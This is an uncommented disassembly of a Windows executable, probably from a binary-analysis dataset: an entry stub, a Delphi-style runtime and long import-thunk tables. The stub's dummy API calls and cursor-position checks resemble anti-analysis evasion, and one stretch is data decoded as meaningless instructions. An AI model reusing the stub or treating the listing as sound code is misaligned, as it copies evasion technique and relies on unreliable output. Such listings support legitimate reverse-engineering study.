mov ecx 0x1f83f9a1
xor edx edx
mov eax ebx
call sub_47f97c
push 0x0
push 0x0
push 0x0
call GetWindowTextA
nop
push 0x8000
push 0x0
push ebx
call VirtualFree
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
nop
jmp r-xdata
push 0x0
push 0x0
push 0x0
call GetWindowTextA
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call GetWinMetaFileBits
call sub_47f908
cmp eax 0x57
jne r-xdata
nop
nop
jmp r-xdata
mov ebx 0x86c9
push 0x0
push 0x0
push 0x0
call GetWindowTextA
nop
nop
dec ebx
jne r-xdata
nop
push 0x0
call RegCloseKey
xor ebx ebx
nop
push edi
call GetCursorPos
nop
cmp eax 0x2c
jbe r-xdata
call sub_40312c
nop
nop
push 0x26
call sub_40645c
nop
nop
cmp ebx 0x7
jle r-xdata
nop
nop
add ebx 0x1
jno r-xdata
nop
nop
push 0xc6
call sub_40645c
nop
nop
jmp r-xdata
call sub_47f9a0
jmp r-xdata
mov eax [ esi ]
mov [ edi ] eax
nop
nop
call sub_40312c
push esi
call GetCursorPos
nop
mov eax [ esi ]
sub eax [ edi ]
jno r-xdata
push 0x0
push 0x0
push 0x0
call GetWindowTextA
sub_47fc80
inc ebx
add [ eax ] al
add [ eax - 0x6fffb804 ] cl
pushad
inc eax
add [ eax + 0x60 ] ah
inc eax
add [ esi + ebx * 2 + 0x5e300040 ] al
inc eax
add [ ecx + 0x40 ] cl
add [ ecx ] bl
inc eax
add [ eax - 0x7fffbf92 ] dh
outsb
inc eax
add al ch
outsb
inc eax
add [ eax + 0x2c00406e ] bh
pop esi
inc ecx
add ah bh
pop ebp
inc ecx
add [ eax ] dl
jb r-xdata
add [ eax ] ch
lds eax [ edx ]
nop
jecxz r-xdata
add al ah
jno r-xdata
test [ edx ] 0x78
add [ eax - 0x1d ] dl
inc edx
add [ eax + 0x500042e3 ] dl
jecxz r-xdata
add al bl
fiadd [ eax ]
pop eax
fld [ eax ]
inc esp
jecxz r-xdata
add [ ecx + eax + 0x43 ] ch
add [ ecx + eax ] bh
inc ebx
add [ ecx + eax ] dh
inc ebx
add [ ecx + eax ] al
inc ebx
add [ edx + eax + 0x43 ] bh
add [ edx + eax + 0x43 ] cl
add [ eax - 0x42 ] cl
inc ebx
add [ eax ] bl
mov esi 0xf2140043
inc esp
add ah ah
int1
inc esp
add al ch
jecxz r-xdata
inc ebx
add [ ebx ] al
and al 0x0
inc ebx
add ah bl
add [ ebx ] eax
lodsb [ esi ]
add [ ebx ] eax
movsb [ edi ] [ esi ]
add [ ebx ] eax
je r-xdata
add [ eax - 0x2d ] bl
inc edx
add [ eax ] ch
rol [ edx ] cl
fmul st3
inc edx
add [ eax - 0x6fffbd35 ] ch
sub [ edx ] eax
pushad
sub [ edx ] eax
rol [ fs : edx ] 0x90
rol [ edx ] 0xf4
inc edx
inc esi
add ah al
inc edx
inc esi
add [ eax + 0x680042d3 ] bl
rol [ edx ] cl
pop eax
test eax 0xa8e80046
inc esi
add al dl
test [ edx ] 0xa0
add [ ebx ] dl
inc eax
add [ eax + 0x4b ] dh
inc ecx
add al bh
dec edx
inc ecx
add [ ecx * 2 + 0x4d0c0041 ] bh
inc ecx
add ah ch
pop edx
inc ecx
add [ edx + ebx * 2 + 0x25c40041 ] bl
inc edx
add [ 0xffffffffc2a00042 ] dl
inc edx
add [ eax - 0x3e ] dh
inc edx
add [ eax - 0x3b ] bl
inc edx
mov al [ 0xffffffffa1400043 ]
inc ebx
add al bh
mov al [ 0xffffffff92540043 ]
inc ebx
add [ edx + edx * 4 ] bl
inc ebx
add [ eax - 0x60 ] dh
inc ebx
add [ eax - 0x60 ] al
inc ebx
add [ eax + 0x6b ] al
inc ebx
add [ eax ] dl
imul eax [ ebx ] 0xffffffb8
push 0x43
add [ edx + ebp * 2 + 0x43 ] bh
add [ ebx + esi * 8 + 0x44 ] bh
add [ ebx + esi * 8 + 0x44 ] cl
add [ ecx - 0x5ea3ffbd ] ch
inc ebx
add [ edx ] al
inc ebx
add [ ecx + 0x6a740043 ] dh
inc ebx
add [ edx + ebp * 2 + 0x43 ] al
add ah ch
stosd [ edi ]
inc esp
add [ ebx + ebp * 4 + 0x44 ] dh
add [ eax ] al
mov eax 0xb7bc0044
inc esp
add [ eax + 0x40004613 ] ch
adc eax [ esi ]
xor al 0x27
inc esi
add [ edi ] al
inc esi
add [ eax ] cl
inc ebp
add al dl
inc [ eax + eax + 0x24 ]
cmc
inc edx
add ah dh
hlt
add [ eax + 0xc0042e3 ] bh
inc edx
add al dl
int1
inc edx
add ah dh
add al [ ebx ]
les eax [ edx ]
inc ebx
add [ ebx + eax ] ch
inc ebx
add ah bh
add al [ ebx ]
pushfd
inc ebp
inc ebx
add [ eax + 0x45 ] al
inc ebx
add ah cl
imul eax [ ebx ] r-xdata
cld
add [ ebx ] al
int3
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax sub_47fc80
call sub_40601c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_475864
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_47587c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4758fc
call sub_403e8c
sub_4011f2
call [ eax + 0x244483cc ]
add al 0xf8
jmp sub_40594c
sub_4011ff
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405974
sub_401209
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405988
sub_4012cc
jmp [ __import_lookup_table_1(user32:CharNextA) ]
ExitProcess
jmp [ __import_lookup_table_0(kernel32:ExitProcess) ]
sub_4012dc
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
sub_4012e4
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
sub_4012ec
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_4012f4
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ __import_lookup_table_0(kernel32:GetCommandLineA) ]
sub_401304
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_40130c
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_401314
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_40131c
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ __import_lookup_table_0(kernel32:GetStartupInfoA) ]
sub_40133c
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
sub_401354
jmp [ __import_lookup_table_0(kernel32:MultiByteToWideChar) ]
sub_40135c
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ __import_lookup_table_0(kernel32:WideCharToMultiByte) ]
sub_40137c
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ SysAllocStringLen@IAT ]
SysReAllocStringLen
jmp [ SysReAllocStringLen@IAT ]
sub_401394
jmp [ __import_lookup_table_3(oleaut32:SysFreeString) ]
InterlockedIncrement
jmp [ __import_lookup_table_0(kernel32:InterlockedIncrement) ]
InterlockedDecrement
jmp [ InterlockedDecrement@IAT ]
sub_4013ac
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_4013bc
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_4013e0
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
sub_4013f8
jmp [ __import_lookup_table_0(kernel32:VirtualFree) ]
sub_401400
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401408
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401410
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401418
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401b62
jmp sub_403980
sub_401b69
mov al [ rw-data ]
pop ebp
retn
sub_401c46
jmp sub_403980
sub_401d14
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_402328
retn
sub_402314
jmp sub_403980
sub_4024ba
jmp sub_403980
sub_402759
jmp sub_403980
sub_40281c
call sub_405fd0
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_405fd0
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_402870
mov [ rw-data ] edx
call sub_403f64
sub_4028d4
push eax
push edx
push ecx
call sub_405fd0
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_4028c8
retn
sub_4028f0
retn
sub_402944
retn
sub_402948
push ebx
call sub_405fd0
mov ebx [ eax + 0x4 ]
call sub_405fd0
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_4029b4
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_4029c4
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_402a84
mov edx [ eax + 0x1c ]
call sub_402a3c
retn
sub_402cec
mov ecx 0xff
call sub_402cf8
retn
sub_402d1c
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402d38
jmp sub_402d38
sub_402d35
retn
sub_4030c5
jmp sub_403980
sub_403118
fninit
fwait
fldcw [ rw-data ]
retn
sub_403178
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_403184
push ebx
mov ebx eax
mov eax ebx
call sub_4031b4
call sub_40276c
mov edx eax
mov eax ebx
call sub_4031f8
pop ebx
retn
sub_4031a0
push ebx
mov ebx eax
mov eax ebx
call sub_403250
mov eax ebx
call sub_40278c
pop ebx
retn
sub_4031b4
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_4031dc
call sub_4035b8
test dl dl
jle r-xdata
retn
call sub_4035a0
sub_40329c
retn
sub_403324
jmp sub_403980
sub_40332b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_403434
mov eax 0x8000ffff
retn
sub_40343c
retn
sub_403440
retn
sub_403444
retn
sub_403579
jmp sub_4036cc
sub_40357e
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_4039e0
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_4035a0
sub_4035a0
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_4035a8
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_4035b8
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_4035c8
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_403690
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_4036ac
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403a79
retn
sub_403bbc
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403c4a
jmp sub_4036cc
sub_403caa
jmp sub_4036cc
sub_403cc4
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403bbc
mov [ rw-data ] 0x0
call sub_403c64
retn
sub_403dfd
retn
sub_403f5f
pop ebp
pop edi
pop esi
pop ebx
retn
sub_403f64
mov [ rw-data ] eax
call sub_403e8c
sub_4041a0
retn
sub_4041dc
retn
sub_4041ea
retn
sub_404203
retn
sub_404214
retn
sub_4042fb
retn
sub_40442c
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
j_sub_404448#2
jmp sub_404448
sub_404491
retn
sub_404499
retn
sub_4044db
retn
sub_404634
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_4028c8
sub_40464c
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call sub_401394
sub_4047a4
retn
sub_4047b6
retn
sub_4047b8
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_4049ac
mov ecx 0x1
jmp sub_404918
sub_4049b6
retn
sub_4049ec
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_4028c8
call [ rw-data ]
retn
sub_404af0
mov ecx 0x1
jmp sub_404a04
sub_404afa
retn
sub_404afc
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_4028c8
call [ rw-data ]
retn
sub_404d22
retn
sub_404d24
push edx
call sub_40276c
pop edx
test eax eax
je r-xdata
retn
push eax
call sub_4049ac
pop eax
sub_404d38
push eax
call sub_404af0
pop eax
call sub_40278c
retn
sub_404d48
xchg ecx eax
xchg edx ecx
call sub_4040d8
retn
sub_404d9c
mov al 0x11
jmp sub_4028c8
sub_404dc7
retn
sub_405008
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404c30
pop ebp
retn 0x4
j_sub_404a04
jmp sub_404a04
sub_40501d
retn
sub_405020
call sub_4051c0
retn
sub_40524c
call sub_405224
retn
sub_405595
jmp sub_403980
sub_405700
call sub_405708
retn
sub_405734
call sub_405744
retn
sub_40573c
call sub_405764
retn
sub_405744
push ebx
mov ebx eax
mov eax 0x8
call sub_40276c
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_4057ff
jmp sub_4036cc
sub_405820
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_405894
jmp sub_403980
sub_40589b
pop ecx
pop ebp
retn
sub_405914
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_405920
add eax 0x4
push eax
call InterlockedDecrement
retn
sub_40592c
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_4028c8
sub_40593c
call sub_403184
mov [ eax + 0x4 ] 0x1
retn
sub_405974
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call InterlockedIncrement
pop ebp
retn 0x4
sub_405c63
jmp sub_403980
sub_405c6a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405d07
jmp sub_403980
sub_405d0e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405d57
jmp sub_403980
sub_405d5e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405e22
jmp sub_403980
sub_405e29
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405e7a
jmp sub_403980
sub_405e81
pop ebp
retn
sub_405f58
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ __import_lookup_table_4(kernel32:LocalAlloc) ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
sub_405f78
push eax
push 0x40
call LocalAlloc
retn
sub_405f84
mov eax 0x10
retn
sub_406010
mov eax rw-data
call sub_405820
retn
sub_406085
jmp sub_403980
sub_40608c
pop ebp
retn
sub_406090
sub [ rw-data ] 0x1
retn
sub_406098
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_4060b4
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_4060bc
test eax eax
je r-xdata
xor eax eax
retn
add [ eax ] edx
add [ eax + 0x8 ] edx
add [ eax + 0x4 ] ecx
add [ eax + 0xc ] ecx
mov al 0x1
retn
sub_406141
jmp sub_403980
sub_406148
pop ebp
retn
sub_40614c
sub [ rw-data ] 0x1
retn
RegOpenKeyExA
jmp [ __import_lookup_table_5(advapi32:RegOpenKeyExA) ]
RegQueryValueExA
jmp [ __import_lookup_table_5(advapi32:RegQueryValueExA) ]
CompareStringA
jmp [ CompareStringA@IAT ]
CreateFileA
jmp [ CreateFileA@IAT ]
CreateThread
jmp [ CreateThread@IAT ]
FileTimeToDosDateTime
jmp [ __import_lookup_table_6(kernel32:FileTimeToDosDateTime) ]
FileTimeToLocalFileTime
jmp [ __import_lookup_table_6(kernel32:FileTimeToLocalFileTime) ]
FindClose
jmp [ __import_lookup_table_6(kernel32:FindClose) ]
FindFirstFileA
jmp [ __import_lookup_table_6(kernel32:FindFirstFileA) ]
FindResourceA
jmp [ __import_lookup_table_6(kernel32:FindResourceA) ]
FormatMessageA
jmp [ FormatMessageA@IAT ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
FreeResource
jmp [ FreeResource@IAT ]
GetACP
jmp [ GetACP@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetComputerNameA
jmp [ __import_lookup_table_6(kernel32:GetComputerNameA) ]
GetCurrentProcessId
jmp [ __import_lookup_table_6(kernel32:GetCurrentProcessId) ]
GetDateFormatA
jmp [ GetDateFormatA@IAT ]
GetDiskFreeSpaceA
jmp [ GetDiskFreeSpaceA@IAT ]
GetFileAttributesA
jmp [ GetFileAttributesA@IAT ]
GetFullPathNameA
jmp [ GetFullPathNameA@IAT ]
GetLocalTime
jmp [ GetLocalTime@IAT ]
GetLocaleInfoA
jmp [ __import_lookup_table_6(kernel32:GetLocaleInfoA) ]
GetModuleHandleA
jmp [ GetModuleHandleA@IAT ]
GetProfileStringA
jmp [ GetProfileStringA@IAT ]
GetStringTypeExA
jmp [ GetStringTypeExA@IAT ]
GetSystemInfo
jmp [ GetSystemInfo@IAT ]
GetUserDefaultLCID
jmp [ GetUserDefaultLCID@IAT ]
GetVersion
jmp [ GetVersion@IAT ]
GetVersionExA
jmp [ GetVersionExA@IAT ]
GlobalAlloc
jmp [ GlobalAlloc@IAT ]
GlobalFindAtomA
jmp [ __import_lookup_table_6(kernel32:GlobalFindAtomA) ]
GlobalHandle
jmp [ GlobalHandle@IAT ]
GlobalReAlloc
jmp [ GlobalReAlloc@IAT ]
GlobalSize
jmp [ __import_lookup_table_6(kernel32:GlobalSize) ]
LeaveCriticalSection
jmp [ __import_lookup_table_6(kernel32:LeaveCriticalSection) ]
LoadLibraryA
jmp [ __import_lookup_table_6(kernel32:LoadLibraryA) ]
LoadResource
jmp [ __import_lookup_table_6(kernel32:LoadResource) ]
LockResource
jmp [ __import_lookup_table_6(kernel32:LockResource) ]
ReadFile
jmp [ ReadFile@IAT ]
ResetEvent
jmp [ ResetEvent@IAT ]
SetEndOfFile
jmp [ __import_lookup_table_6(kernel32:SetEndOfFile) ]
SetEvent
jmp [ SetEvent@IAT ]
SetFilePointer
jmp [ __import_lookup_table_6(kernel32:SetFilePointer) ]
SetThreadLocale
jmp [ __import_lookup_table_6(kernel32:SetThreadLocale) ]
SizeofResource
jmp [ SizeofResource@IAT ]
VirtualAlloc
jmp [ VirtualAlloc@IAT ]
VirtualFree
jmp [ VirtualFree@IAT ]
VirtualQuery
jmp [ VirtualQuery@IAT ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
lstrcmpA
jmp [ lstrcmpA@IAT ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
GetFileVersionInfoA
jmp [ GetFileVersionInfoA@IAT ]
GetFileVersionInfoSizeA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoSizeA) ]
VerQueryValueA
jmp [ VerQueryValueA@IAT ]
CloseEnhMetaFile
jmp [ __import_lookup_table_8(gdi32:CloseEnhMetaFile) ]
CopyEnhMetaFileA
jmp [ __import_lookup_table_8(gdi32:CopyEnhMetaFileA) ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ __import_lookup_table_8(gdi32:CreateBrushIndirect) ]
CreateDCA
jmp [ CreateDCA@IAT ]
CreateDIBSection
jmp [ CreateDIBSection@IAT ]
CreateDIBitmap
jmp [ __import_lookup_table_8(gdi32:CreateDIBitmap) ]
CreateEnhMetaFileA
jmp [ __import_lookup_table_8(gdi32:CreateEnhMetaFileA) ]
CreateHalftonePalette
jmp [ __import_lookup_table_8(gdi32:CreateHalftonePalette) ]
CreateICA
jmp [ CreateICA@IAT ]
CreatePalette
jmp [ CreatePalette@IAT ]
CreatePenIndirect
jmp [ CreatePenIndirect@IAT ]
DeleteEnhMetaFile
jmp [ DeleteEnhMetaFile@IAT ]
EndDoc
jmp [ EndDoc@IAT ]
EndPage
jmp [ __import_lookup_table_8(gdi32:EndPage) ]
ExcludeClipRect
jmp [ __import_lookup_table_8(gdi32:ExcludeClipRect) ]
ExtTextOutA
jmp [ __import_lookup_table_8(gdi32:ExtTextOutA) ]
GetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:GetBrushOrgEx) ]
GetClipBox
jmp [ __import_lookup_table_8(gdi32:GetClipBox) ]
GetCurrentPositionEx
jmp [ GetCurrentPositionEx@IAT ]
GetDCOrgEx
jmp [ GetDCOrgEx@IAT ]
GetDIBColorTable
jmp [ GetDIBColorTable@IAT ]
GetEnhMetaFileHeader
jmp [ GetEnhMetaFileHeader@IAT ]
GetPixel
jmp [ __import_lookup_table_8(gdi32:GetPixel) ]
GetTextExtentPoint32A
jmp [ GetTextExtentPoint32A@IAT ]
GetTextMetricsA
jmp [ GetTextMetricsA@IAT ]
GetWindowOrgEx
jmp [ GetWindowOrgEx@IAT ]
LPtoDP
jmp [ __import_lookup_table_8(gdi32:LPtoDP) ]
LineTo
jmp [ __import_lookup_table_8(gdi32:LineTo) ]
MaskBlt
jmp [ __import_lookup_table_8(gdi32:MaskBlt) ]
MoveToEx
jmp [ __import_lookup_table_8(gdi32:MoveToEx) ]
PlayEnhMetaFile
jmp [ PlayEnhMetaFile@IAT ]
Polyline
jmp [ Polyline@IAT ]
RectVisible
jmp [ RectVisible@IAT ]
Rectangle
jmp [ Rectangle@IAT ]
SetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:SetBrushOrgEx) ]
SetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:SetDIBColorTable) ]
SetEnhMetaFileBits
jmp [ __import_lookup_table_8(gdi32:SetEnhMetaFileBits) ]
SetMapMode
jmp [ __import_lookup_table_8(gdi32:SetMapMode) ]
SetPixel
jmp [ __import_lookup_table_8(gdi32:SetPixel) ]
SetROP2
jmp [ SetROP2@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ __import_lookup_table_9(user32:ActivateKeyboardLayout) ]
AdjustWindowRectEx
jmp [ __import_lookup_table_9(user32:AdjustWindowRectEx) ]
CharLowerA
jmp [ __import_lookup_table_9(user32:CharLowerA) ]
BeginPaint
jmp [ __import_lookup_table_9(user32:BeginPaint) ]
BringWindowToTop
jmp [ __import_lookup_table_9(user32:BringWindowToTop) ]
CallNextHookEx
jmp [ CallNextHookEx@IAT ]
CharLowerBuffA
jmp [ __import_lookup_table_9(user32:CharLowerBuffA) ]
CharNextA
jmp [ __import_lookup_table_9(user32:CharNextA) ]
CharToOemA
jmp [ __import_lookup_table_9(user32:CharToOemA) ]
CheckMenuItem
jmp [ CheckMenuItem@IAT ]
ChildWindowFromPoint
jmp [ __import_lookup_table_9(user32:ChildWindowFromPoint) ]
ClientToScreen
jmp [ ClientToScreen@IAT ]
CreateIcon
jmp [ CreateIcon@IAT ]
CreateMenu
jmp [ CreateMenu@IAT ]
CreatePopupMenu
jmp [ CreatePopupMenu@IAT ]
DefFrameProcA
jmp [ DefFrameProcA@IAT ]
DefMDIChildProcA
jmp [ DefMDIChildProcA@IAT ]
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
DestroyIcon
jmp [ DestroyIcon@IAT ]
DestroyMenu
jmp [ __import_lookup_table_9(user32:DestroyMenu) ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
DispatchMessageA
jmp [ __import_lookup_table_9(user32:DispatchMessageA) ]
DrawFrameControl
jmp [ DrawFrameControl@IAT ]
DrawIcon
jmp [ DrawIcon@IAT ]
DrawIconEx
jmp [ __import_lookup_table_9(user32:DrawIconEx) ]
DrawMenuBar
jmp [ __import_lookup_table_9(user32:DrawMenuBar) ]
EnableScrollBar
jmp [ __import_lookup_table_9(user32:EnableScrollBar) ]
EnableWindow
jmp [ EnableWindow@IAT ]
EndPaint
jmp [ __import_lookup_table_9(user32:EndPaint) ]
EnumThreadWindows
jmp [ EnumThreadWindows@IAT ]
EnumWindows
jmp [ __import_lookup_table_9(user32:EnumWindows) ]
EqualRect
jmp [ __import_lookup_table_9(user32:EqualRect) ]
FindWindowA
jmp [ __import_lookup_table_9(user32:FindWindowA) ]
GetClassNameA
jmp [ __import_lookup_table_9(user32:GetClassNameA) ]
GetClientRect
jmp [ __import_lookup_table_9(user32:GetClientRect) ]
GetClipboardData
jmp [ __import_lookup_table_9(user32:GetClipboardData) ]
GetCursor
jmp [ GetCursor@IAT ]
GetDC
jmp [ GetDC@IAT ]
GetDCEx
jmp [ __import_lookup_table_9(user32:GetDCEx) ]
GetDlgItem
jmp [ __import_lookup_table_9(user32:GetDlgItem) ]
GetForegroundWindow
jmp [ GetForegroundWindow@IAT ]
GetIconInfo
jmp [ __import_lookup_table_9(user32:GetIconInfo) ]
GetKeyNameTextA
jmp [ __import_lookup_table_9(user32:GetKeyNameTextA) ]
GetKeyboardLayout
jmp [ GetKeyboardLayout@IAT ]
GetKeyboardLayoutList
jmp [ __import_lookup_table_9(user32:GetKeyboardLayoutList) ]
GetKeyboardState
jmp [ __import_lookup_table_9(user32:GetKeyboardState) ]
GetLastActivePopup
jmp [ GetLastActivePopup@IAT ]
GetMenu
jmp [ __import_lookup_table_9(user32:GetMenu) ]
GetMenuItemID
jmp [ GetMenuItemID@IAT ]
GetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:GetMenuItemInfoA) ]
GetMenuStringA
jmp [ __import_lookup_table_9(user32:GetMenuStringA) ]
GetMessageTime
jmp [ __import_lookup_table_9(user32:GetMessageTime) ]
__imp_GetWindow
jmp [ GetWindow@IAT ]
GetParent
jmp [ GetParent@IAT ]
GetPropA
jmp [ __import_lookup_table_9(user32:GetPropA) ]
GetScrollInfo
jmp [ __import_lookup_table_9(user32:GetScrollInfo) ]
GetScrollRange
jmp [ __import_lookup_table_9(user32:GetScrollRange) ]
GetSubMenu
jmp [ __import_lookup_table_9(user32:GetSubMenu) ]
GetSysColor
jmp [ GetSysColor@IAT ]
GetSysColorBrush
jmp [ GetSysColorBrush@IAT ]
GetSystemMenu
jmp [ __import_lookup_table_9(user32:GetSystemMenu) ]
GetTopWindow
jmp [ GetTopWindow@IAT ]
GetWindowDC
jmp [ GetWindowDC@IAT ]
GetWindowPlacement
jmp [ __import_lookup_table_9(user32:GetWindowPlacement) ]
GetWindowRect
jmp [ __import_lookup_table_9(user32:GetWindowRect) ]
__imp_GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
InsertMenuItemA
jmp [ __import_lookup_table_9(user32:InsertMenuItemA) ]
IsChild
jmp [ IsChild@IAT ]
IsDialogMessageA
jmp [ __import_lookup_table_9(user32:IsDialogMessageA) ]
IsRectEmpty
jmp [ __import_lookup_table_9(user32:IsRectEmpty) ]
IsWindow
jmp [ __import_lookup_table_9(user32:IsWindow) ]
IsWindowEnabled
jmp [ IsWindowEnabled@IAT ]
IsZoomed
jmp [ __import_lookup_table_9(user32:IsZoomed) ]
KillTimer
jmp [ __import_lookup_table_9(user32:KillTimer) ]
LoadBitmapA
jmp [ __import_lookup_table_9(user32:LoadBitmapA) ]
LoadIconA
jmp [ __import_lookup_table_9(user32:LoadIconA) ]
LoadStringA
jmp [ __import_lookup_table_9(user32:LoadStringA) ]
MapVirtualKeyA
jmp [ __import_lookup_table_9(user32:MapVirtualKeyA) ]
MessageBoxA
jmp [ MessageBoxA@IAT ]
OemToCharA
jmp [ OemToCharA@IAT ]
PeekMessageA
jmp [ PeekMessageA@IAT ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
PtInRect
jmp [ __import_lookup_table_9(user32:PtInRect) ]
RedrawWindow
jmp [ RedrawWindow@IAT ]
RegisterClassA
jmp [ RegisterClassA@IAT ]
RegisterClipboardFormatA
jmp [ __import_lookup_table_9(user32:RegisterClipboardFormatA) ]
ReleaseCapture
jmp [ ReleaseCapture@IAT ]
ReleaseDC
jmp [ __import_lookup_table_9(user32:ReleaseDC) ]
RemoveMenu
jmp [ __import_lookup_table_9(user32:RemoveMenu) ]
ScrollWindow
jmp [ __import_lookup_table_9(user32:ScrollWindow) ]
SetActiveWindow
jmp [ SetActiveWindow@IAT ]
SetCapture
jmp [ SetCapture@IAT ]
SetClassLongA
jmp [ SetClassLongA@IAT ]
SetForegroundWindow
jmp [ __import_lookup_table_9(user32:SetForegroundWindow) ]
SetMenuItemInfoA
